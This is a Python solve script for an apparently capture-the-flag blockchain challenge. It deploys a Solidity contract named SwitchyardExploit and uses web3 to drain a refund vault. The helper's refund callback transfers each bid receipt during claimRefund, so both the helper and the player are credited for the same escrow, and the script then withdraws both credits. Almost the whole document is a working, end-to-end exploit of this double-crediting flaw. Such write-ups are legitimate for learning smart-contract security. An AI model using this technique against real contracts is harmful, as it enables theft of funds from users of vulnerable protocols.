import os
from web3 import Web3
from solcx import compile_source, install_solc, set_solc_version

RPC = "https://rpc-01kz101qg2xdggnz4n4ee91x7n.u-ctf-ctf-7001b39a.urc.tf/"

PRIVATE_KEY = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
TOKEN_ADDR   = Web3.to_checksum_address("0xE7948205D1DEa623AfC508aA064166c56486cb59")
AUCTION_ADDR = Web3.to_checksum_address("0x1025C44442298B90F1cB0D5eD6E471862E34F046")
VAULT_ADDR   = Web3.to_checksum_address("0x8fc1e7b477A5bDE56588ffA563daB1215FBf168E")

w3 = Web3(Web3.HTTPProvider(RPC))
acct = w3.eth.account.from_key(PRIVATE_KEY)
chain_id = w3.eth.chain_id
nonce = w3.eth.get_transaction_count(acct.address)

print("[+] chain id:", chain_id)
print("[+] player:", acct.address)

AUCTION_ABI = [
    {
        "inputs": [{"internalType": "bytes32", "name": "commitment", "type": "bytes32"}],
        "name": "commitBid",
        "outputs": [{"internalType": "uint256", "name": "receiptId", "type": "uint256"}],
        "stateMutability": "payable",
        "type": "function",
    },
    {
        "inputs": [
            {"internalType": "uint256", "name": "receiptId", "type": "uint256"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"},
            {"internalType": "bytes32", "name": "salt", "type": "bytes32"},
        ],
        "name": "revealBid",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "closeAuction",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "closed",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
]

TOKEN_ABI = [
    {
        "inputs": [],
        "name": "nextId",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "uint256", "name": "tokenId", "type": "uint256"}],
        "name": "ownerOf",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
]

VAULT_ABI = [
    {
        "inputs": [
            {"internalType": "uint256", "name": "receiptId", "type": "uint256"},
            {"internalType": "bytes", "name": "callbackData", "type": "bytes"},
        ],
        "name": "claimRefund",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "address", "name": "", "type": "address"}],
        "name": "credits",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "isEmpty",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
]

HELPER_SOURCE = r'''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IAuctionHouse {
    function commitBid(bytes32 commitment) external payable returns (uint256 receiptId);
    function revealBid(uint256 receiptId, uint256 amount, bytes32 salt) external;
}

interface IBidReceiptToken {
    function transferFrom(address from, address to, uint256 tokenId) external;
}

interface IRefundVault {
    function withdraw(uint256 amount) external;
}

contract SwitchyardExploit {
    address public owner;
    IAuctionHouse public auction;
    IBidReceiptToken public token;
    IRefundVault public vault;

    constructor(address auction_, address token_, address vault_, address owner_) {
        auction = IAuctionHouse(auction_);
        token = IBidReceiptToken(token_);
        vault = IRefundVault(vault_);
        owner = owner_;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    function commit(bytes32 commitment) external payable onlyOwner returns (uint256) {
        return auction.commitBid{value: msg.value}(commitment);
    }

    function reveal(uint256 receiptId, uint256 amount, bytes32 salt) external onlyOwner {
        auction.revealBid(receiptId, amount, salt);
    }

    function onRefundSnapshot(uint256 receiptId, bytes calldata data) external {
        require(msg.sender == address(auction), "only auction");
        address newOwner = abi.decode(data, (address));
        token.transferFrom(address(this), newOwner, receiptId);
    }

    function pullCredit(uint256 amount) external onlyOwner {
        vault.withdraw(amount);

        (bool ok, ) = payable(owner).call{value: address(this).balance}("");
        require(ok, "send failed");
    }

    receive() external payable {}
}
'''

auction = w3.eth.contract(address=AUCTION_ADDR, abi=AUCTION_ABI)
token = w3.eth.contract(address=TOKEN_ADDR, abi=TOKEN_ABI)
vault = w3.eth.contract(address=VAULT_ADDR, abi=VAULT_ABI)


def add_fee(tx):
    block = w3.eth.get_block("latest")
    if "baseFeePerGas" in block and block["baseFeePerGas"] is not None:
        base = block["baseFeePerGas"]
        tx["maxFeePerGas"] = base * 3 + w3.to_wei(1, "gwei")
        tx["maxPriorityFeePerGas"] = 0
    else:
        tx["gasPrice"] = w3.eth.gas_price
    return tx


def send_tx(tx, label):
    global nonce

    tx["from"] = acct.address
    tx["nonce"] = nonce
    tx["chainId"] = chain_id

    if "gas" not in tx:
        try:
            tx["gas"] = int(w3.eth.estimate_gas(tx) * 1.3)
        except Exception:
            tx["gas"] = 1_500_000

    tx = add_fee(tx)

    signed = acct.sign_transaction(tx)
    raw = getattr(signed, "rawTransaction", None) or signed.raw_transaction

    h = w3.eth.send_raw_transaction(raw)
    rcpt = w3.eth.wait_for_transaction_receipt(h, timeout=120)

    print(f"[+] {label}: {h.hex()} status={rcpt.status} gas={rcpt.gasUsed}")
    nonce += 1

    if rcpt.status != 1:
        raise RuntimeError(f"{label} failed")

    return rcpt


def commitment(amount, salt):
    return Web3.solidity_keccak(["uint256", "bytes32"], [amount, salt])


def deploy_helper():
    print("[+] installing/using solc 0.8.20...")
    install_solc("0.8.20")
    set_solc_version("0.8.20")

    compiled = compile_source(
        HELPER_SOURCE,
        output_values=["abi", "bin"],
        solc_version="0.8.20",
    )

    _, contract_interface = compiled.popitem()
    helper_contract = w3.eth.contract(
        abi=contract_interface["abi"],
        bytecode=contract_interface["bin"],
    )

    tx = helper_contract.constructor(
        AUCTION_ADDR,
        TOKEN_ADDR,
        VAULT_ADDR,
        acct.address,
    ).build_transaction({
        "gas": 2_500_000,
    })

    rcpt = send_tx(tx, "deploy helper")
    helper_addr = rcpt.contractAddress

    print("[+] helper:", helper_addr)

    return w3.eth.contract(address=helper_addr, abi=contract_interface["abi"])


def main():
    global nonce

    player_bal = w3.eth.get_balance(acct.address)
    vault_bal = w3.eth.get_balance(VAULT_ADDR)

    print("[+] player balance:", w3.from_wei(player_bal, "ether"), "ETH")
    print("[+] vault balance :", w3.from_wei(vault_bal, "ether"), "ETH")
    print("[+] solved before :", auction.functions.isSolved().call())

    if vault_bal == 0:
        print("[+] vault already empty")
        print("[+] solved:", auction.functions.isSolved().call())
        return

    if auction.functions.closed().call():
        raise RuntimeError("auction already closed; use a fresh instance/challenge reset")

    helper = deploy_helper()

    # Pakai banyak losing bids supaya total modal tidak perlu sebesar vault.
    n_losing = 4
    gas_reserve = w3.to_wei(0.05, "ether")

    while True:
        losing_amount = (vault_bal + (2 * n_losing) - 1) // (2 * n_losing)
        if losing_amount <= 0:
            losing_amount = 1

        winning_amount = losing_amount + 1
        needed = losing_amount * n_losing + winning_amount + gas_reserve

        if needed < player_bal:
            break

        n_losing *= 2
        if n_losing > 64:
            raise RuntimeError("not enough ETH to run exploit safely")

    print("[+] losing bids :", n_losing)
    print("[+] losing amount:", w3.from_wei(losing_amount, "ether"), "ETH each")
    print("[+] winner amount:", w3.from_wei(winning_amount, "ether"), "ETH")

    losing = []

    # Commit losing bids from helper contract.
    # Receipt owner becomes helper, so callback can run.
    for i in range(n_losing):
        salt = os.urandom(32)
        c = commitment(losing_amount, salt)

        receipt_id = token.functions.nextId().call()

        tx = helper.functions.commit(c).build_transaction({
            "value": losing_amount,
            "gas": 500_000,
        })
        send_tx(tx, f"commit losing #{i} receipt={receipt_id}")

        losing.append((receipt_id, losing_amount, salt))

    # Commit one higher bid directly from EOA.
    # This becomes the winner and is intentionally not refunded.
    winner_salt = os.urandom(32)
    winner_commit = commitment(winning_amount, winner_salt)
    winner_receipt = token.functions.nextId().call()

    tx = auction.functions.commitBid(winner_commit).build_transaction({
        "value": winning_amount,
        "gas": 300_000,
    })
    send_tx(tx, f"commit winner receipt={winner_receipt}")

    # Reveal all losing bids from helper.
    for receipt_id, amount, salt in losing:
        tx = helper.functions.reveal(receipt_id, amount, salt).build_transaction({
            "gas": 500_000,
        })
        send_tx(tx, f"reveal losing receipt={receipt_id}")

    # Reveal winner from EOA.
    tx = auction.functions.revealBid(
        winner_receipt,
        winning_amount,
        winner_salt,
    ).build_transaction({
        "gas": 300_000,
    })
    send_tx(tx, f"reveal winner receipt={winner_receipt}")

    # Close auction.
    tx = auction.functions.closeAuction().build_transaction({
        "gas": 250_000,
    })
    send_tx(tx, "close auction")

    # During claimRefund:
    # ownerBefore = helper
    # callback transfers receipt helper -> player
    # ownerAfter = player
    # vault credits both helper and player for same escrow
    callback_data = w3.codec.encode(["address"], [acct.address])

    for receipt_id, _, _ in losing:
        before_owner = token.functions.ownerOf(receipt_id).call()
        print(f"[+] owner before claim receipt {receipt_id}:", before_owner)

        tx = vault.functions.claimRefund(receipt_id, callback_data).build_transaction({
            "gas": 700_000,
        })
        send_tx(tx, f"claim refund receipt={receipt_id}")

        after_owner = token.functions.ownerOf(receipt_id).call()
        print(f"[+] owner after claim receipt {receipt_id} :", after_owner)

    helper_credit = vault.functions.credits(helper.address).call()
    player_credit = vault.functions.credits(acct.address).call()
    vault_balance = w3.eth.get_balance(VAULT_ADDR)

    print("[+] helper credit:", w3.from_wei(helper_credit, "ether"), "ETH")
    print("[+] player credit:", w3.from_wei(player_credit, "ether"), "ETH")
    print("[+] vault balance before withdraw:", w3.from_wei(vault_balance, "ether"), "ETH")

    # Withdraw helper credit first.
    if vault_balance > 0 and helper_credit > 0:
        amount = min(helper_credit, vault_balance)
        tx = helper.functions.pullCredit(amount).build_transaction({
            "gas": 700_000,
        })
        send_tx(tx, f"withdraw helper credit {amount}")

    # Withdraw remaining vault balance using player's credit.
    vault_balance = w3.eth.get_balance(VAULT_ADDR)
    player_credit = vault.functions.credits(acct.address).call()

    if vault_balance > 0 and player_credit > 0:
        amount = min(player_credit, vault_balance)
        tx = vault.functions.withdraw(amount).build_transaction({
            "gas": 400_000,
        })
        send_tx(tx, f"withdraw player credit {amount}")

    print("[+] vault balance after:", w3.from_wei(w3.eth.get_balance(VAULT_ADDR), "ether"), "ETH")
    print("[+] vault isEmpty:", vault.functions.isEmpty().call())
    print("[+] isSolved:", auction.functions.isSolved().call())


if __name__ == "__main__":
    main()
